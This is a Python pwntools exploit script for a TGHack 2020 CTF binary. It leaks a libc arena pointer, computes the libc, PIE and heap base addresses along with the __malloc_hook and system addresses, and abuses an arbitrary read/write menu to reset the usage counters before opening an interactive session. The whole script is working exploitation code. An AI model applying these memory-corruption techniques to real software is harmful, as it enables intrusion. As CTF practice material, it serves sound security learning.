from pwn import *
target=process(["/media/sf_kalishared/tghack2020/Crap/ld-2.31.so", "./crapreal"], env={"LD_PRELOAD":"/media/sf_kalishared/tghack2020/Crap/libc-2.31.so","LD_LIBRARY_PATH":"/usr/lib/x86_64-linux-gnu/"})

libc=ELF('/media/sf_kalishared/tghack2020/Crap/libc-2.31.so')

context.terminal=["tmux","split","-h"]
gdb.attach(target)

def leavefb(feedback,keep):
    print(target.recvuntil("> "))
    target.sendline("3")
    print(target.recvuntil("feedback: "))
    target.sendline(feedback)
    print(target.recvuntil("(y/n)\n"))
    target.sendline(keep)

def viewfb():
    print(target.recvuntil("> "))
    target.sendline("4")
    print(target.recvuntil("feedback: "))
    leak=target.recvline().strip("\n")
    return leak

def write(addr,value):
    print(target.recvuntil("> "))
    target.sendline("2")
    print(target.recvuntil("value: "))
    target.sendline(addr+" "+value)

def read(addr):
    print(target.recvuntil("> "))
    target.sendline("1")
    print(target.recvuntil("addr: "))
    target.sendline(addr)
    print(target.recvuntil("value: "))
    leak=target.recvline().strip("\n")
    return leak

off=0x3b5be0
pieoff=0x3bb000
feedbackoff=0x202038
writecountoff=0x202034
readcountoff=0x202030

leavefb("Aaa","n")
leak=viewfb()

libc_arenap=u64(leak+"\x00"*(8-len(leak)))
libc_base=libc_arenap-off
libc_mhook=libc_base+libc.symbols["__malloc_hook"]
libc_system=libc_base+libc.symbols["system"]
pie_base=libc_base+pieoff
pie_feedback=pie_base+feedbackoff
pie_writecount=pie_base+writecountoff
pie_readcount=pie_base+readcountoff

print("libc arenap="+hex(libc_arenap))
print("libc base="+hex(libc_base))
print("libc malloc hook="+hex(libc_mhook))
print("pie base="+hex(pie_base))
print("pie feedback="+hex(pie_feedback))
print("pie writecount="+hex(pie_writecount))



allocmem=read(hex(pie_feedback)[2:14])
print("allocmem="+allocmem)
heap_base=int(allocmem,16)-0x2090
print("heap_base="+hex(heap_base))

write(hex(pie_writecount)[2:14],str(-100))
write(hex(pie_readcount)[2:14],str(-100))
#write(hex(pie_feedback)[2:14],"0")



#print(target.recvuntil("> "))

#target.sendline("3")

target.interactive()
